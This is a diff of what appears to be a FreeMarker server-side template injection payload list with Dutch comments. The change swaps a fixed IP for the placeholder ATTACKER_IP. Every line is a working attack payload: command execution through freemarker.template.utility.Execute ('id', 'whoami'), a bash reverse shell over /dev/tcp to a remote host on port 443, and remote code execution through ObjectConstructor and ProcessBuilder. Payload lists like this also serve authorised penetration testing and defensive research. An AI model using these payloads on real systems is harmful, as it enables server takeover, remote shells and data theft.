@@ -4,7 +4,7 @@
 ${"freemarker.template.utility.Execute"?new()("id")}
 ${"freemarker.template.utility.Execute"?new()("whoami")}
 # Reverse shell:
-${"freemarker.template.utility.Execute"?new()("bash -c 'bash -i >& /dev/tcp/10.0.0.1/443 0>&1'")}
+${"freemarker.template.utility.Execute"?new()("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'")}
 # === RCE via ObjectConstructor ===
 ${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["id"])}
 # === File lezen ===
